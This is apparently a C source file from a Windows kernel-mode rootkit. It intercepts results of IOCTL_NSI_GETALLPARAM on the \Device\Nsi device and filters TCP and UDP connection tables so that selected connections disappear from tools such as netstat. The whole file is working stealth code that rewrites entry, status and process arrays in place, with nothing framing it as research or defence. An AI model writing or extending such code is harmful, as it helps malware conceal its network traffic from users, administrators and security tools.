#include "hook_ioctl.h"

static PDEVICE_OBJECT g_NsiDeviceObject = NULL;
static BOOLEAN g_IoctlHookInitialized = FALSE;

static const UCHAR NsiTcpModuleId[] = {
    0x18, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x03, 0x4A, 0x00, 0xEB, 0x1A, 0x9B, 0xD4, 0x11,
    0x91, 0x23, 0x00, 0x50, 0x04, 0x77, 0x59, 0xBC
};

static const UCHAR NsiUdpModuleId[] = {
    0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x03, 0x4A, 0x00, 0xEB, 0x1A, 0x9B, 0xD4, 0x11,
    0x91, 0x23, 0x00, 0x50, 0x04, 0x77, 0x59, 0xBC
};

NTSTATUS IoctlHookInitialize()
{
    g_NsiDeviceObject = GetNsiDeviceObject();
    g_IoctlHookInitialized = TRUE;
    return STATUS_SUCCESS;
}

VOID IoctlHookCleanup()
{
    g_IoctlHookInitialized = FALSE;
    g_NsiDeviceObject = NULL;
}

PDEVICE_OBJECT GetNsiDeviceObject()
{
    NTSTATUS status;
    UNICODE_STRING deviceName;
    PFILE_OBJECT fileObject = NULL;
    PDEVICE_OBJECT deviceObject = NULL;
    
    RtlInitUnicodeString(&deviceName, L"\\Device\\Nsi");
    
    status = IoGetDeviceObjectPointer(&deviceName, FILE_READ_DATA, &fileObject, &deviceObject);
    
    if (NT_SUCCESS(status) && fileObject)
    {
        ObDereferenceObject(fileObject);
        return deviceObject;
    }
    
    return NULL;
}

BOOLEAN IsNsiDevice(HANDLE FileHandle)
{
    NTSTATUS status;
    PFILE_OBJECT fileObject = NULL;
    BOOLEAN isNsi = FALSE;
    
    if (!FileHandle || FileHandle == (HANDLE)-1)
        return FALSE;
    
    status = ObReferenceObjectByHandle(FileHandle, 0, *IoFileObjectType, KernelMode, (PVOID*)&fileObject, NULL);
    
    if (NT_SUCCESS(status) && fileObject)
    {
        if (fileObject->DeviceObject == g_NsiDeviceObject)
            isNsi = TRUE;
        ObDereferenceObject(fileObject);
    }
    
    return isNsi;
}

VOID FilterTcpTable(PVOID Buffer, ULONG Length)
{
    if (!Buffer || Length < sizeof(MIB_TCPTABLE_OWNER_PID))
        return;
    
    __try
    {
        PMIB_TCPTABLE_OWNER_PID table = (PMIB_TCPTABLE_OWNER_PID)Buffer;
        ULONG originalCount = table->dwNumEntries;
        ULONG writeIndex = 0;
        
        for (ULONG i = 0; i < originalCount; i++)
        {
            PMIB_TCPROW_OWNER_PID row = &table->table[i];
            USHORT localPort = (USHORT)(row->dwLocalPort & 0xFFFF);
            USHORT remotePort = (USHORT)(row->dwRemotePort & 0xFFFF);
            
            if (ShouldHideConnection(row->dwLocalAddr, localPort, row->dwRemoteAddr, remotePort))
                continue;
            
            if (writeIndex != i)
                RtlCopyMemory(&table->table[writeIndex], row, sizeof(MIB_TCPROW_OWNER_PID));
            writeIndex++;
        }
        
        table->dwNumEntries = writeIndex;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
}

VOID FilterUdpTable(PVOID Buffer, ULONG Length)
{
    if (!Buffer || Length < sizeof(MIB_UDPTABLE_OWNER_PID))
        return;
    
    __try
    {
        PMIB_UDPTABLE_OWNER_PID table = (PMIB_UDPTABLE_OWNER_PID)Buffer;
        ULONG originalCount = table->dwNumEntries;
        ULONG writeIndex = 0;
        
        for (ULONG i = 0; i < originalCount; i++)
        {
            PMIB_UDPROW_OWNER_PID row = &table->table[i];
            USHORT localPort = (USHORT)(row->dwLocalPort & 0xFFFF);
            
            if (ShouldHideConnection(row->dwLocalAddr, localPort, 0, 0))
                continue;
            
            if (writeIndex != i)
                RtlCopyMemory(&table->table[writeIndex], row, sizeof(MIB_UDPROW_OWNER_PID));
            writeIndex++;
        }
        
        table->dwNumEntries = writeIndex;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
}

VOID FilterNsiTcpResult(PNSI_PARAM NsiParam)
{
    if (!NsiParam || !NsiParam->Entries || NsiParam->Count == 0)
        return;
    
    __try
    {
        PNSI_TCP_ENTRY entries = (PNSI_TCP_ENTRY)NsiParam->Entries;
        PNSI_TCP_STATUS statusEntries = (PNSI_TCP_STATUS)NsiParam->StatusEntries;
        PNSI_TCP_PROCESS processEntries = (PNSI_TCP_PROCESS)NsiParam->ProcessEntries;
        
        ULONG originalCount = NsiParam->Count;
        ULONG writeIndex = 0;
        
        for (ULONG i = 0; i < originalCount; i++)
        {
            PNSI_TCP_ENTRY entry = (PNSI_TCP_ENTRY)((PUCHAR)entries + i * NsiParam->EntrySize);
            
            ULONG localAddr = *(PULONG)entry->LocalAddr;
            ULONG remoteAddr = *(PULONG)entry->RemoteAddr;
            USHORT localPort = (USHORT)(entry->LocalPort & 0xFFFF);
            USHORT remotePort = (USHORT)(entry->RemotePort & 0xFFFF);
            
            if (ShouldHideConnection(localAddr, localPort, remoteAddr, remotePort))
                continue;
            
            if (writeIndex != i)
            {
                PVOID srcEntry = (PUCHAR)entries + i * NsiParam->EntrySize;
                PVOID dstEntry = (PUCHAR)entries + writeIndex * NsiParam->EntrySize;
                RtlCopyMemory(dstEntry, srcEntry, NsiParam->EntrySize);
                
                if (statusEntries && NsiParam->StatusEntrySize > 0)
                {
                    PVOID srcStatus = (PUCHAR)statusEntries + i * NsiParam->StatusEntrySize;
                    PVOID dstStatus = (PUCHAR)statusEntries + writeIndex * NsiParam->StatusEntrySize;
                    RtlCopyMemory(dstStatus, srcStatus, NsiParam->StatusEntrySize);
                }
                
                if (processEntries && NsiParam->ProcessEntrySize > 0)
                {
                    PVOID srcProcess = (PUCHAR)processEntries + i * NsiParam->ProcessEntrySize;
                    PVOID dstProcess = (PUCHAR)processEntries + writeIndex * NsiParam->ProcessEntrySize;
                    RtlCopyMemory(dstProcess, srcProcess, NsiParam->ProcessEntrySize);
                }
            }
            writeIndex++;
        }
        
        NsiParam->Count = writeIndex;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
}

VOID FilterNsiUdpResult(PNSI_PARAM NsiParam)
{
    if (!NsiParam || !NsiParam->Entries || NsiParam->Count == 0)
        return;
    
    __try
    {
        PNSI_UDP_ENTRY entries = (PNSI_UDP_ENTRY)NsiParam->Entries;
        PNSI_TCP_PROCESS processEntries = (PNSI_TCP_PROCESS)NsiParam->ProcessEntries;
        
        ULONG originalCount = NsiParam->Count;
        ULONG writeIndex = 0;
        
        for (ULONG i = 0; i < originalCount; i++)
        {
            PNSI_UDP_ENTRY entry = (PNSI_UDP_ENTRY)((PUCHAR)entries + i * NsiParam->EntrySize);
            
            ULONG localAddr = *(PULONG)entry->LocalAddr;
            USHORT localPort = (USHORT)(entry->LocalPort & 0xFFFF);
            
            if (ShouldHideConnection(localAddr, localPort, 0, 0))
                continue;
            
            if (writeIndex != i)
            {
                PVOID srcEntry = (PUCHAR)entries + i * NsiParam->EntrySize;
                PVOID dstEntry = (PUCHAR)entries + writeIndex * NsiParam->EntrySize;
                RtlCopyMemory(dstEntry, srcEntry, NsiParam->EntrySize);
                
                if (processEntries && NsiParam->ProcessEntrySize > 0)
                {
                    PVOID srcProcess = (PUCHAR)processEntries + i * NsiParam->ProcessEntrySize;
                    PVOID dstProcess = (PUCHAR)processEntries + writeIndex * NsiParam->ProcessEntrySize;
                    RtlCopyMemory(dstProcess, srcProcess, NsiParam->ProcessEntrySize);
                }
            }
            writeIndex++;
        }
        
        NsiParam->Count = writeIndex;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
}

VOID HandleDeviceIoControlExit(HANDLE FileHandle, ULONG IoControlCode, PVOID OutputBuffer, ULONG OutputBufferLength, PIO_STATUS_BLOCK IoStatusBlock)
{
    if (!g_IoctlHookInitialized)
        return;
    
    if (!IoStatusBlock || !NT_SUCCESS(IoStatusBlock->Status))
        return;
    
    if (!OutputBuffer || OutputBufferLength == 0)
        return;
    
    __try
    {
        if (IoControlCode == IOCTL_NSI_GETALLPARAM && IsNsiDevice(FileHandle))
        {
            PNSI_PARAM nsiParam = (PNSI_PARAM)OutputBuffer;
            
            if (!MmIsAddressValid(nsiParam))
                return;
            
            if (nsiParam->ModuleId && MmIsAddressValid(nsiParam->ModuleId))
            {
                if (RtlCompareMemory(nsiParam->ModuleId, NsiTcpModuleId, sizeof(NsiTcpModuleId)) == sizeof(NsiTcpModuleId))
                    FilterNsiTcpResult(nsiParam);
                else if (RtlCompareMemory(nsiParam->ModuleId, NsiUdpModuleId, sizeof(NsiUdpModuleId)) == sizeof(NsiUdpModuleId))
                    FilterNsiUdpResult(nsiParam);
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
}
